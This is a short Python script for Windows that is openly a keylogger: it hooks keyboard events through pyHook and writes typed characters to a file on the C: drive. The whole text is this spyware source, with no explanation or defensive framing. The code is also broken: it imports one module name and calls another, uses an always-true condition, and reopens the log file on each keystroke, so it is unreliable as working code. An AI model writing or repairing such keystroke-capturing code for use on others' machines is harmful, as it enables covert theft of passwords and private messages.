import win32api 
import sys
import pythoncom, pyHook3 

def OnKeyboardEvent(event):
    if event.Ascii == 5: 
        sys.exit() 
    if event.Ascii != 0 or 8: 
        f = open('c:\\output.txt', 'w') 
        keylogs = chr(event.Ascii) 
    if event.Ascii == 13: 
        keylogs = keylogs + '\n' 
        f.write(keylogs) 
        f.close()
        
def main():
    hm = pyHook.HookManager() 
    hm.KeyDown = OnKeyboardEvent 
    hm.HookKeyboard() 
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()